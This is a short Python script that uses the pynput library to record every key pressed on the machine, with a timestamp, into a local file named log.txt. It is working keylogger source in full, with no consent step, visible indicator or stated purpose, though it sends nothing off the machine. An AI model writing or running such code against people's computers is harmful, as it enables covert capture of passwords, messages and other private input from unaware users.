from pynput.keyboard import Key, Listener
from datetime import datetime as dt


def on_press(key):
    log = str(dt.now()) + ' -> ' + str(key) + '\n'
    open('log.txt', mode='a').write(log)
    # print(log)


with Listener(on_press=on_press) as listener:
    listener.join()
